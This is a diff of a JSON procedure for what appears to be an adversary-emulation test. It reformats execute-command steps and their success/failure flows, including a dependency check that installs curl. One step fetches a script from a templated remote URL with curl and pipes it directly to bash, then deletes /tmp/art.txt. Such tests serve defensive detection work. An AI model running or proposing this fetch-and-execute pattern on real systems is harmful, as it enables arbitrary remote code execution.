@@ -7,87 +7,87 @@
   ],
   "steps": [
     {
-      "id": "8d97b677-2aae-442d-bdac-b65db54239f0",
+      "id": "0785874a-58de-4c89-836a-3e44572e2be0",
       "type": "execute-command",
       "data": {
-        "command": "cd /tmp\ncurl -s #{remote_url} |bash\nls -la /tmp/art.txt      \n",
+        "command": "cd /tmp\ncurl -s #{remote_url} |bash\nls -la /tmp/art.txt",
         "command_type": "sh"
       },
       "elevation_required": false
     },
     {
-      "id": "a014e4a1-f4f1-446b-89f6-086b35c147a4",
+      "id": "7ce0b519-0f0c-4c49-9aaf-1d3b8ff1f301",
       "type": "execute-command",
       "data": {
-        "command": "rm /tmp/art.txt\n",
+        "command": "rm /tmp/art.txt",
         "command_type": "sh"
       },
       "elevation_required": false
     },
     {
-      "id": "685c782b-9c2c-41ed-b457-73983284a0cf",
+      "id": "7b240896-9f9c-4325-b4e2-43fb835799a2",
       "name": "Check dependency 1/1",
       "description": "Check if curl is installed on the machine.\n",
       "type": "execute-command",
       "data": {
-        "command": "if [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
-        "command_type": ""
+        "command": "if [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi",
+        "command_type": "sh"
       },
       "elevation_required": false
     },
     {
-      "id": "00918cdc-eb01-4561-976d-49f7e21c3c3f",
+      "id": "23c32105-b90b-4f81-9282-ee53b48b2fae",
       "name": "Resolve dependency 1/1",
       "description": "Check if curl is installed on the machine.\n",
       "type": "execute-command",
       "data": {
-        "command": "which apt \u0026\u0026 apt update \u0026\u0026 apt install -y curl || which pkg \u0026\u0026 pkg update \u0026\u0026 pkg install -y curl\n",
-        "command_type": ""
+        "command": "which apt \u0026\u0026 apt update \u0026\u0026 apt install -y curl || which pkg \u0026\u0026 pkg update \u0026\u0026 pkg install -y curl",
+        "command_type": "sh"
       },
       "elevation_required": false
     },
     {
-      "id": "3b015cb5-e98d-4714-9e46-ae3f05f1e522",
+      "id": "e57d5518-0149-48d6-b91e-5d4da9254e37",
       "name": "Re-check dependency 1/1",
       "description": "Check if curl is installed on the machine.\n",
       "type": "execute-command",
       "data": {
-        "command": "if [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
-        "command_type": ""
+        "command": "if [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi",
+        "command_type": "sh"
       },
       "elevation_required": false
     }
   ],
   "flows": [
     {
-      "s": "8d97b677-2aae-442d-bdac-b65db54239f0",
+      "s": "0785874a-58de-4c89-836a-3e44572e2be0",
       "p": "on-success",
-      "o": "a014e4a1-f4f1-446b-89f6-086b35c147a4"
+      "o": "7ce0b519-0f0c-4c49-9aaf-1d3b8ff1f301"
     },
     {
-      "s": "8d97b677-2aae-442d-bdac-b65db54239f0",
+      "s": "0785874a-58de-4c89-836a-3e44572e2be0",
       "p": "on-failure",
-      "o": "a014e4a1-f4f1-446b-89f6-086b35c147a4"
+      "o": "7ce0b519-0f0c-4c49-9aaf-1d3b8ff1f301"
     },
     {
-      "s": "685c782b-9c2c-41ed-b457-73983284a0cf",
+      "s": "7b240896-9f9c-4325-b4e2-43fb835799a2",
       "p": "on-success",
-      "o": "8d97b677-2aae-442d-bdac-b65db54239f0"
+      "o": "0785874a-58de-4c89-836a-3e44572e2be0"
     },
     {
-      "s": "685c782b-9c2c-41ed-b457-73983284a0cf",
+      "s": "7b240896-9f9c-4325-b4e2-43fb835799a2",
       "p": "on-failure",
-      "o": "00918cdc-eb01-4561-976d-49f7e21c3c3f"
+      "o": "23c32105-b90b-4f81-9282-ee53b48b2fae"
     },
     {
-      "s": "00918cdc-eb01-4561-976d-49f7e21c3c3f",
+      "s": "23c32105-b90b-4f81-9282-ee53b48b2fae",
       "p": "on-success",
-      "o": "3b015cb5-e98d-4714-9e46-ae3f05f1e522"
+      "o": "e57d5518-0149-48d6-b91e-5d4da9254e37"
     },
     {
-      "s": "3b015cb5-e98d-4714-9e46-ae3f05f1e522",
+      "s": "e57d5518-0149-48d6-b91e-5d4da9254e37",
       "p": "on-failure",
-      "o": "8d97b677-2aae-442d-bdac-b65db54239f0"
+      "o": "0785874a-58de-4c89-836a-3e44572e2be0"
     }
   ],
   "tags": [
